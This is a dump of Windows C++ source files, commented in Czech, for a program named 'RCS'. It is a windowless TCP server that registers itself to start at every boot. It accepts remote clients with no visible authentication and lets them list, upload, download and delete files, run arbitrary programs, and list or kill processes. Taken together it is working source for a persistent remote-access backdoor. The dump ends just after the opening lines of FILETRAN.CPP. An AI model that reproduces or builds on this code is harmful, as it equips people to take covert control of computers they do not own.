
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[RCS.CPP]ÄÄÄ
#include <stdio.h>
#include <winsock2.h>
#include <winsock.h>
#include <io.h>

//#include "stdafx.h"	// pro preklad s predkompilovanejma hlavickama
#include "universal.h"


// globalni promneny pro pocitani tredu a pristup k serveru
int pocet_tredu = 0; // urcuje pocet tredu na obsluhu useru    pocet useru = pocet tredu
char server_close = 0;  // pristup pro ostatni usery   1 - zavren   0 - otevren 
// nastaveni
NASTAVENI_DATA nast; // structura pro nastaveni


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
					 LPSTR cmd_str, int nCmdShow)
{
	
	struct sockaddr_in	client_addr;
	int error;	// promnena pro chyby, vice v knihovne errors.h
	int client; // neco pro klienta
	SOCKET primar_socket, client_socket;
	DWORD thread;
	HANDLE new_thread;

	//Tady by nekde mnelo bejt zjisteni vlastniho mena programu

	LoadNas("pokus.txt"); // nacita nastaveni predavam mu fail s nastavenim

	// registrace aby se spoustel po kazdym startu
	RegService();

	// struktura pro inicializaci site
	WORD wVersionRequested; 
	WSADATA wsaData; 	
	// inicializace site
	wVersionRequested = MAKEWORD( 1, 1);
	if(WSAStartup(wVersionRequested, &wsaData ) < 0)
		return -1;
	// moje fce definovana v server.cpp
	error=CreateSocket(nast.tcp_p, &primar_socket);
	if(error < 0)
		return error;
	
	

	for(;;)
	{

		client = sizeof(client_addr);
		client_socket = accept(primar_socket, (struct sockaddr *) &client_addr,
			&client);
		
		if(server_close == 1 || pocet_tredu >= MAX_USERS)
		{
			send(client_socket, "\r\nSorry, ale server byl zavren uzivatelem", 42,0);			
			client_socket = -1;
		}
		
		if(client_socket < 0)
			closesocket(client_socket);
		else
		{
			new_thread = CreateThread(NULL, 0, ServClient, 
				(VOID *) &client_socket, 0, &thread); 
						
			if(new_thread == NULL)
			{
				return 0;
			}			
			
			CloseHandle(new_thread);
		}

		
	}
	WSACleanup();
	return 0;
}
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[RCS.CPP]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[RCS.DSP]ÄÄÄ
# Microsoft Developer Studio Project File - Name="rcs" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=rcs - Win32 Debug
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "rcs.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "rcs.mak" CFG="rcs - Win32 Debug"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "rcs - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE "rcs - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "rcs - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /Yu"stdafx.h" /FD /c
# ADD CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /FD /c
# SUBTRACT CPP /WX /Fr /YX /Yc /Yu
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x405 /d "NDEBUG"
# ADD RSC /l 0x405 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib wsock32.lib /nologo /subsystem:windows /machine:I386

!ELSEIF  "$(CFG)" == "rcs - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 1
# PROP BASE Output_Dir "Debug"
# PROP BASE Intermediate_Dir "Debug"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 1
# PROP Output_Dir "Debug"
# PROP Intermediate_Dir "Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_MBCS" /Yu"stdafx.h" /FD /GZ /c
# ADD CPP /nologo /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_MBCS" /FD /GZ /c
# SUBTRACT CPP /YX /Yc /Yu
# ADD BASE MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x405 /d "_DEBUG"
# ADD RSC /l 0x405 /d "_DEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /debug /machine:I386 /pdbtype:sept
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib wsock32.lib /nologo /subsystem:windows /debug /machine:I386 /pdbtype:sept

!ENDIF 

# Begin Target

# Name "rcs - Win32 Release"
# Name "rcs - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Source File

SOURCE=.\commands.cpp
# End Source File
# Begin Source File

SOURCE=.\errors.cpp
# End Source File
# Begin Source File

SOURCE=.\interpret.cpp
# End Source File
# Begin Source File

SOURCE=.\obsluha.cpp
# End Source File
# Begin Source File

SOURCE=.\rcs.cpp
# End Source File
# Begin Source File

SOURCE=.\server.cpp
# End Source File
# Begin Source File

SOURCE=.\StdAfx.cpp
# ADD CPP /Yc"stdafx.h"
# End Source File
# Begin Source File

SOURCE=.\ufce.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Source File

SOURCE=.\commands.h
# End Source File
# Begin Source File

SOURCE=.\StdAfx.h
# End Source File
# Begin Source File

SOURCE=.\universal.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# End Group
# Begin Source File

SOURCE=.\ReadMe.txt
# End Source File
# End Target
# End Project
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[RCS.DSP]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[COMMANDS.CPP]ÄÄÄ
// jednotlive prikazy interpretu

#include <stdio.h>
#include <winsock2.h>
#include <winsock.h>
#include <io.h>
#include <winbase.h>

#include "universal.h"
#include "commands.h"

// globalni promneny pro pocitani tredu a pristup k serveru
extern int pocet_tredu; // urcuje pocet tredu na obsluhu useru    pocet useru = pocet tredu
extern char server_close;  // pristup pro ostatni usery   1 - zavren   0 - otevren 


int pwd(SOCKET *socket, char parametry[MAX_DELKA_RADKU])
{
	DWORD error;
	char cesta[260];

	error = GetCurrentDirectory(260, cesta);
	if(error == 0)
	{
		send(*socket, "\r\nError", 7,0);
		return -1;
	}	
	send(*socket, "\r\n", 2,0);
	send(*socket, cesta, strlen(cesta),0);
	return 0;
}

int cd(SOCKET *socket, char parametry[MAX_DELKA_RADKU])
{
	int error;
	

	error = SetCurrentDirectory(parametry);
	if(error == FALSE)
	{
		send(*socket, "\r\nAdresar neexistuje nebo neni pristupny", 41,0);
		return -1;
	}
	return 0;
}

int dir(SOCKET *socket, char parametry[MAX_DELKA_RADKU])
{
	
	WIN32_FIND_DATA informace;
	HANDLE find_h;

	if(lstrlen(parametry) == 0)
		parametry = "*.*";

	if(strchr(parametry, '\\'))
	{
		char *pomocnej = parametry;
		while(strchr(pomocnej,'\\'))
			pomocnej = strchr(pomocnej,'\\')+1;
		if(lstrlen(pomocnej) == 0)
			strcat(parametry, "*.*");
	}

	find_h = FindFirstFile(parametry, &informace);

	if(find_h == INVALID_HANDLE_VALUE)
	{
		send(*socket, "\r\nAdresar je prazdnej pripadne neexistuje", 41,0);
		return 0;
	}
	send(*socket, "\r\n",2 ,0);
	if((informace.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY)
	{
		send(*socket, "<", 1,0);
		send(*socket, informace.cFileName, strlen(informace.cFileName),0);
		send(*socket, ">", 1,0);
	}
	else
		send(*socket, informace.cFileName, strlen(informace.cFileName),0);
	
	while(FindNextFile(find_h, &informace))
	{
		send(*socket, "\r\n",2 ,0);
		
		if((informace.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY)
		{
			send(*socket, "<", 1,0);
			send(*socket, informace.cFileName, strlen(informace.cFileName),0);
			send(*socket, ">", 1,0);
		}
		else
			send(*socket, informace.cFileName, strlen(informace.cFileName),0);	
	}
	
	FindClose(find_h);
	return 0;
}

int server(SOCKET *socket,char parametry [MAX_DELKA_RADKU])
{
	if(strcmp(parametry, "open") == 0)
		server_close = 0;
	if(strcmp(parametry, "close") == 0)
		server_close = 1;

	if((strcmp(parametry, "close") != 0) && (strcmp(parametry, "open") != 0))
	{	
		if(server_close == 1)
			send(*socket, "\r\nServer: close ", 16,0);
		if(server_close == 0)
			send(*socket, "\r\nServer: open ", 15,0);
		char pocet_users_string[1024];
		itoa(pocet_tredu, pocet_users_string, 10);
		send(*socket, "\r\nPocet pripojenych uzivatelu: ", 31,0);
		send(*socket, pocet_users_string, strlen(pocet_users_string),0);
	}	
	return 0;
}

int m_rename(SOCKET *socket, char parametry [MAX_DELKA_RADKU])
{
	char string_one[MAX_DELKA_RADKU];
	char string_two[MAX_DELKA_RADKU];	
	char hlaska[]="\r\nSpatny parametry s \"";
	 
	if(strchr(parametry, '\"'))
	{
		char *begin = strchr(parametry, '\"');
		char *end = strchr(begin+1,'\"');
		if(!end)
		{
			send(*socket, hlaska, lstrlen(hlaska),0);
			return -1;
		}
		memmove(string_one,begin+1,end-begin-1);
		string_one[end-begin-1] = 0;

		begin = strchr(end+1, '\"');
		end = strchr(begin+1,'\"');
		if(!begin){
			send(*socket, hlaska, lstrlen(hlaska),0);
			return -1;
		}
		if(!end){
			send(*socket, hlaska, lstrlen(hlaska),0);
			return -1;
		}
		memmove(string_two,begin+1,end-begin-1);
		string_two[end-begin-1] = 0;
	}
	else
		CopyStrToSpace(parametry, string_one, string_two);

	if(string_two[lstrlen(string_two)-1] == '\\')
	{
		char *file = string_one;

		while(strchr(file,'\\'))
			file = strchr(file,'\\')+1;

		strcat(string_two,file);
	}
	
	if(MoveFile(string_one, string_two) == FALSE)
		send(*socket, "\r\nSoubor neexistuje", 19,0);

	return 0;
}

int m_copy(SOCKET *socket, char parametry [MAX_DELKA_RADKU])
{
	char string_one[MAX_DELKA_RADKU];
	char string_two[MAX_DELKA_RADKU];	
	char hlaska[]="\r\nSpatny parametry s \"";
	 
	if(strchr(parametry, '\"'))
	{
		char *begin = strchr(parametry, '\"');
		char *end = strchr(begin+1,'\"');
		if(!end){
			send(*socket, hlaska, lstrlen(hlaska),0);
			return -1;
		}
		memmove(string_one,begin+1,end-begin-1);
		string_one[end-begin-1] = 0;

		begin = strchr(end+1, '\"');
		end = strchr(begin+1,'\"');
		if(!begin){
			send(*socket, hlaska, lstrlen(hlaska),0);
			return -1;
		}
		if(!end){
			send(*socket, hlaska, lstrlen(hlaska),0);
			return -1;
		}
		memmove(string_two,begin+1,end-begin-1);
		string_two[end-begin-1] = 0;
	}
	else
		CopyStrToSpace(parametry, string_one, string_two);
	
	if(string_two[lstrlen(string_two)-1] == '\\')
	{
		char *file = string_one;

		while(strchr(file,'\\'))
			file = strchr(file,'\\')+1;

		strcat(string_two,file);
	}

	WIN32_FIND_DATA informace;
	HANDLE find_h;
	int copy=0;
	char pomoc[260];

	find_h = FindFirstFile(string_one, &informace);
	if(find_h == INVALID_HANDLE_VALUE)
	{
		send(*socket, "\r\nSoubor neexistuje", 19,0);
		return 0;
	}

	if((informace.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY)
	{}
	else
	{
		lstrcpy(pomoc, string_two);
		lstrcat(pomoc, "\\");
		lstrcat(pomoc, informace.cFileName);
		if(CopyFile(informace.cFileName, pomoc, TRUE) == TRUE)
			copy++;
	}

	while(FindNextFile(find_h, &informace))
	{

		if((informace.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY)
		{}
		else
		{
			lstrcpy(pomoc, string_two);
			lstrcat(pomoc, "\\");
			lstrcat(pomoc, informace.cFileName);
			if(CopyFile(informace.cFileName, pomoc, TRUE) == FALSE)
				copy++;
		}
	}
	FindClose(find_h);
	return 0;
}

int x(SOCKET *socket, char parametry [MAX_DELKA_RADKU])
{
	STARTUPINFO si;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);

	PROCESS_INFORMATION p_info;

	if(CreateProcess(NULL, parametry, NULL, NULL, FALSE, 
		0, NULL, NULL, &si, &p_info)== 0)
		send(*socket, "\r\nProgram neexistuje", 20,0);

	CloseHandle(p_info.hProcess);
	CloseHandle(p_info.hThread);
	
	return 0;
}

/******************************* DOWNLOAD ************************************/

int download(SOCKET *socket, char parametry [MAX_DELKA_RADKU])
{
	DATA_PREN *dw;
	dw = (DATA_PREN *) malloc(sizeof(DATA_PREN));
	char port[MAX_DELKA_RADKU];
	HANDLE file;
	DWORD thread;
	HANDLE new_thread;

	CopyStrToSpace(parametry, dw->name_file , port);

	file = CreateFile(dw->name_file, GENERIC_READ, FILE_SHARE_READ, NULL,
		OPEN_EXISTING, 0, NULL);
	if(file	== INVALID_HANDLE_VALUE)
	{
		send(*socket, "\r\nSoubor neexistuje nebo jej pouziva jinej program", 50,0);
		return -1;
	}
	
	CloseHandle(file);

	dw->port = atoi(port);
	if((dw->port < 1) || (dw->port > 65535))
	{
		send(*socket, "\r\nSpatny cislo portu", 20,0);
		return -1;
	}
	
	new_thread = CreateThread(NULL, 0, downloadt, 
	(VOID *) dw, 0, &thread); 
	if(new_thread == NULL)
	{
		send(*socket, "\r\nNemuzu vytvorit thread", 22,0);
		return -1;
	}			

	CloseHandle(new_thread);

	/* pak by tady mohla bejt komunikacni trubka na potvrzeni prenosu */

	send(*socket, "\r\nPrenos byl zahajen na portu: ", 31,0);
	send(*socket, port, lstrlen(port),0);
	return 0;
}

DWORD WINAPI downloadt(LPVOID adres)
{
	struct DATA_PREN data;
	data = *((DATA_PREN *) adres);
	free(adres);
	SOCKET p_socket, c_socket;
	struct sockaddr_in	c_addr;
	int clt;
	
	char znak=0; //kontrolni znak
	int error=0;
	
	if(CreateSocket(data.port, &p_socket)<0)
		return -1;
	
start:

	clt = sizeof(c_addr);
	c_socket = accept(p_socket, (struct sockaddr *) &c_addr,
			&clt);

	if(c_socket == INVALID_SOCKET)
		return -1;

	HANDLE file;
	DWORD velikost, neco;
	char velikost_str[24];
	file = CreateFile(data.name_file, GENERIC_READ, FILE_SHARE_READ, NULL,
		OPEN_EXISTING, 0, NULL);
	
	velikost = GetFileSize(file, &neco);

	send(c_socket, "download", 8, 0);
	
	itoa(velikost, velikost_str, 10);
	send(c_socket, velikost_str, lstrlen(velikost_str), 0);
	
	for(; znak != 'y';)
	{
		error = recv(c_socket, &znak, 1, 0);
		if(error < 1) 
		{
			CloseHandle(file);
			closesocket(p_socket);
			closesocket(c_socket);
			goto start;
		}
		if(znak == 'n')
		{
			CloseHandle(file);
			closesocket(p_socket);
			closesocket(c_socket);
			return 0;
		}
	}

	
	char buff[1024];
	DWORD pocet_zap;

	ReadFile(file, buff, 1024, &pocet_zap, NULL);

	while(pocet_zap != 0)
	{
		send(c_socket, buff, pocet_zap, 0);
		ReadFile(file, buff, 1024, &pocet_zap, NULL);
	}
	
	CloseHandle(file);
	closesocket(p_socket);
	closesocket(c_socket);
	return 0;
}


/*************************** END DOWNLOAD **************************/


/*************************** UPLOAD ********************************/

int upload(SOCKET *socket, char parametry [MAX_DELKA_RADKU])
{
	DATA_PREN *dw;
	dw = (DATA_PREN *) malloc(sizeof(DATA_PREN));
	char port[MAX_DELKA_RADKU];
	DWORD thread;
	HANDLE new_thread;

	CopyStrToSpace(parametry, dw->name_file , port);

	dw->port = atoi(port);
	if((dw->port < 1) || (dw->port > 65535))
	{
		send(*socket, "\r\nSpatny cislo portu", 20,0);
		return -1;
	}
	
	new_thread = CreateThread(NULL, 0, uploadt, 
	(VOID *) dw, 0, &thread); 
	if(new_thread == NULL)
	{
		send(*socket, "\r\nNemuzu vytvorit thread", 22,0);
		return -1;
	}			

	CloseHandle(new_thread);

	/* pak by tady mohla bejt komunikacni trubka na potvrzeni prenosu */

	send(*socket, "\r\nPrenos byl zahajen na portu: ", 31,0);
	send(*socket, port, lstrlen(port),0);
	return 0;
}

DWORD WINAPI uploadt(LPVOID adres)
{
	struct DATA_PREN data;
	data = *((DATA_PREN *) adres);
	free(adres);
	SOCKET p_socket, c_socket;
	struct sockaddr_in	c_addr;
	int clt;
	
	char znak=0; //kontrolni znak
	int error=0;
	
	if(CreateSocket(data.port, &p_socket)<0)
		return -1;
	

	clt = sizeof(c_addr);
	c_socket = accept(p_socket, (struct sockaddr *) &c_addr,
			&clt);

	if(c_socket == INVALID_SOCKET)
		return -1;

	HANDLE file;
	file = CreateFile(data.name_file, GENERIC_WRITE, 0, NULL,
		CREATE_ALWAYS, 0, NULL);
	send(c_socket, "upload", 6, 0);
	
	char buff[1024];
	int pocet_read; 
	unsigned long pocet_write;

	for(;;)
	{
		
		pocet_read = recv(c_socket, buff, 1024, 0);
		if(pocet_read < 1)
		{
			// konec uploadu
			closesocket(p_socket);
			closesocket(c_socket);
			CloseHandle(file);
			return 0;
		}
		WriteFile(file, buff, pocet_read, &pocet_write, NULL);
	}
	
	CloseHandle(file);
	closesocket(p_socket);
	closesocket(c_socket);
	return 0;
}

/*************************** END UPLOAD *****************************/

int del(SOCKET *socket, char parametry[MAX_DELKA_RADKU])
{
	WIN32_FIND_DATA informace;
	HANDLE find_h;
	int del=0;

	find_h = FindFirstFile(parametry, &informace);

	if(find_h == INVALID_HANDLE_VALUE)
	{
		send(*socket, "\r\nAdresar je prazdnej pripadne neexistuje", 41,0);
		return 0;
	}
	
	if((informace.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY)
	{}
	else
	{
		if(DeleteFile(informace.cFileName) == TRUE)
			del++;
	}

	while(FindNextFile(find_h, &informace))
	{

		if((informace.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY)
		{}
		else
		{
			if(DeleteFile(informace.cFileName) == TRUE)
				del++;
			
		}
		
 
	}
	FindClose(find_h);
	return 0;
}

int md(SOCKET *socket, char parametry[MAX_DELKA_RADKU])
{
	if(CreateDirectory(parametry, NULL) == FALSE)
	{
		send(*socket, "\r\nNelze vytvorit", 16,0);
		return -1;
	}
	return 0;
}

int rd(SOCKET *socket, char parametry[MAX_DELKA_RADKU])
{
	WIN32_FIND_DATA informace;
	HANDLE find_h;
	int del=0;

	find_h = FindFirstFile(parametry, &informace);

	if(find_h == INVALID_HANDLE_VALUE)
	{
		send(*socket, "\r\nAdresar neexistuje", 41,0);
		return 0;
	}
	
	if((informace.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY)
	{
		if(lstrcmp(informace.cFileName, ".") != 0  && lstrcmp(informace.cFileName, "..") != 0)
		{
			if(RemoveDirectory(informace.cFileName) == TRUE)
				del++;
		}
	}
	while(FindNextFile(find_h, &informace))
	{

		if((informace.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY)
		{
			if(lstrcmp(informace.cFileName, ".") != 0  && lstrcmp(informace.cFileName, "..") != 0)
			{
				if(RemoveDirectory(informace.cFileName) == TRUE)
					del++;
			}
		}
		
 
	}
	FindClose(find_h);
	return 0;
}

int m_move(SOCKET *socket, char parametry[MAX_DELKA_RADKU])
{
	char string_one[MAX_DELKA_PARAMETRU], string_two[MAX_DELKA_RADKU];
	m_copy(socket, parametry);
	CopyStrToSpace(parametry, string_one, string_two);
	del(socket, string_one);

	return 0;
}

// operace s procesama nedodelano
int ps(SOCKET *socket, char parametry[MAX_DELKA_RADKU])
{

	OSVERSIONINFO inf;
	
	inf.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	if(GetVersionEx(&inf) == 0)
	{
		send(*socket, "\r\nNemohu zjistit verzy OS", 25, 0);
		return -1;
	}


	if(inf.dwPlatformId == VER_PLATFORM_WIN32_NT)
	{

		HINSTANCE h_module;
		int error = 0;
		h_module = LoadLibrary("psapi.dll");
		if(h_module == NULL)
		{
			send(*socket, "\r\nNenalezl jsem PSAPI.DLL", 28, 0);
			return -1;
		}
		typ_EnumProcesses EnumProcesses;
		typ_EnumProcessModules EnumProcessModules;
		typ_GetModuleBaseName GetModuleBaseName;

		EnumProcesses = (typ_EnumProcesses)GetProcAddress(h_module, "EnumProcesses");
		if(EnumProcesses == NULL) error++;
		EnumProcessModules = (typ_EnumProcessModules)GetProcAddress(h_module, "EnumProcessModules");
		if(EnumProcessModules == NULL) error++;
		GetModuleBaseName = (typ_GetModuleBaseName)GetProcAddress(h_module, "GetModuleBaseNameA");
		if(GetModuleBaseName == NULL) error++;

		if(error != 0)
		{
			send(*socket, "\r\nChyba pri nacitani s PSAPI.DLL", 35, 0);
			return -1;
		}


		DWORD p_pid[MAX_PRINT_PROCES];
		DWORD poc_proces=0;
		unsigned int i=0;
		HANDLE proces;
		char meno[100];
		char pid[64];
		DWORD vel_mena_nacteno;
		HMODULE han_modul;
		DWORD nacteno_modulu;
		
		EnumProcesses(p_pid, MAX_PRINT_PROCES, 
			&poc_proces);
		
		while(i < (poc_proces/4))
		{

			proces = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ ,
				FALSE, p_pid[i]);

			if(proces == NULL)
			{
				send(*socket, "\r\nNelze zjistit informace - ", 28, 0);
			}
			else
			{
				EnumProcessModules(proces, &han_modul, sizeof(han_modul), 
					&nacteno_modulu);

				vel_mena_nacteno = GetModuleBaseName(proces, han_modul, meno, 
					sizeof(meno));
									
				if(vel_mena_nacteno == 0)
				{
					send(*socket, "\r\nNelze zjistit jmeno - ", 24, 0);
				}
				else
				{
					send(*socket, "\r\n", 2, 0);
					send(*socket, meno, vel_mena_nacteno, 0);
					send(*socket, " - ", 3, 0);			
				}
			}
								
			itoa(p_pid[i], pid, 10);
			send(*socket, pid, lstrlen(pid), 0);
			CloseHandle(han_modul);
			CloseHandle(proces);
			i++;
		}
		FreeLibrary(h_module);
	}

	if(inf.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
	{
		//windoze 9x
		send(*socket, "\r\nNefunguje pod timto OS", 24, 0);	
	}
	
	return 0;
}

int kill(SOCKET *socket, char parametry[MAX_DELKA_RADKU])
{
	HANDLE proces;
	DWORD pid;
	
	pid = atoi(parametry);
	proces = OpenProcess(PROCESS_TERMINATE, TRUE, pid);
	if(proces == NULL)
	{
		send(*socket, "\r\nChybnej pid nebo nemas prava.", 31, 0);
		return -1;
	}
	if(TerminateProcess(proces, 0) == 0)
	{
		send(*socket, "\r\nProces nesel ukoncit", 22, 0);
		return -2;
	}
	CloseHandle(proces);

	send(*socket, "\r\nProces byl ukoncen", 20, 0);
	return 0;
}
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[COMMANDS.CPP]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[COMMANDS.H]ÄÄÄ
#ifndef _commands_h_
#define _commands_h_

int pwd(SOCKET *socket, char parametry[MAX_DELKA_RADKU]);

int cd(SOCKET *socket, char parametry[MAX_DELKA_RADKU]);

int dir(SOCKET *socket, char parametry[MAX_DELKA_RADKU]);

int server(SOCKET *socket, char parametry[MAX_DELKA_RADKU]);

int m_rename(SOCKET *socket, char parametry[MAX_DELKA_RADKU]);

int m_copy(SOCKET *socket, char parametry[MAX_DELKA_RADKU]);

int x(SOCKET *socket, char parametry[MAX_DELKA_RADKU]);

int download(SOCKET *socket, char parametry[MAX_DELKA_RADKU]);
DWORD WINAPI downloadt(LPVOID adres);

int upload(SOCKET *socket, char parametry[MAX_DELKA_RADKU]);
DWORD WINAPI uploadt(LPVOID adres);

int del(SOCKET *socket, char parametry[MAX_DELKA_RADKU]);

int md(SOCKET *socket, char parametry[MAX_DELKA_RADKU]);

int rd(SOCKET *socket, char parametry[MAX_DELKA_RADKU]);

int m_move(SOCKET *socket, char parametry[MAX_DELKA_RADKU]);

int ps(SOCKET *socket, char parametry[MAX_DELKA_RADKU]);
// typy na volani fci psapi.dll
typedef BOOL (__stdcall *typ_EnumProcesses)(DWORD *, DWORD, DWORD *);
typedef BOOL (__stdcall *typ_EnumProcessModules)(HANDLE, HMODULE *, DWORD, DWORD *);
typedef DWORD (__stdcall *typ_GetModuleBaseName)(HANDLE, HMODULE, LPTSTR, DWORD);
//konec ps

int kill(SOCKET *socket, char parametry[MAX_DELKA_RADKU]);
#endif
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[COMMANDS.H]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[ERRORS.CPP]ÄÄÄ
////////////////////////////////////////
//             cisla chyb             //
////////////////////////////////////////
// kazda fce kterou sem delal ma prirazeny cislo ktery
// vrati pri chybe. Tady jsou ty cisla a k nim je 
// napsany ktera to je fce  a kde je definovna
/*

vsechny cisla fce vracej zaporny

1	-fce WSAStartup(); v souboru server.cpp
	inicializace site

2	-fce socket(); v souboru server.cpp
	vztvoreni socketu

3	-fce bind(); v souboru server.cpp
	pojmenovani socketu

4	-fce recv(); v souboru obsluha.cpp
	vetsinou pri padu klienta

5	-fce lisen v souboru server.cpp

*/
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[ERRORS.CPP]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[FILETRAN.CPP]ÄÄÄ
//  transportni utilita pro RCS 0.0.1
#include <winsock2.h>
#include <conio.h>
#include <string.h>
#include "stdafx.h"

